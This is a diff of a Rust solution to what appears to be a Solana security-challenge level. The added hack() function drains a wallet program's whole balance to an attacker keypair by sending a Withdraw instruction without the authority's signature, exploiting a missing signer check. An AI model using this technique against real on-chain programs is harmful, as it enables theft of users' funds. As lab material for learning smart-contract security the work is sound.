@@ -1,13 +1,17 @@
 use std::{env, str::FromStr};
 
+use borsh::BorshSerialize;
 use owo_colors::OwoColorize;
 use poc_framework::solana_sdk::signature::Keypair;
 use poc_framework::{
     keypair, solana_sdk::signer::Signer, Environment, LocalEnvironment, PrintableTransaction,
 };
+use solana_program::instruction::{Instruction, AccountMeta};
 use solana_program::native_token::lamports_to_sol;
 
 use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
+
+use level1::WalletInstruction::Withdraw;
 
 struct Challenge {
     hacker: Keypair,
@@ -17,7 +21,24 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+    // amnount to hack
+    let amount = env.get_account(challenge.wallet_address).unwrap().lamports;
+    // missing signer validation, we can call the program directly
+    env.execute_as_transaction(&[Instruction{
+        program_id: challenge.wallet_program,
+        accounts: vec![
+            AccountMeta::new(challenge.wallet_address, false),
+            AccountMeta::new_readonly(challenge.wallet_authority, false),
+            AccountMeta::new(challenge.hacker.pubkey(), false),
+            AccountMeta::new_readonly(system_program::id(), false),
+        ],
+        data: Withdraw { amount }.try_to_vec().unwrap(), // sol_to_lamports(1.0) -> drain the amount may show a deseralize issue since the account lack of rent and removed
+
+    }], 
+    &[],).print(); // &challenge.hacker
+
+}
 
 /*
 SETUP CODE BELOW
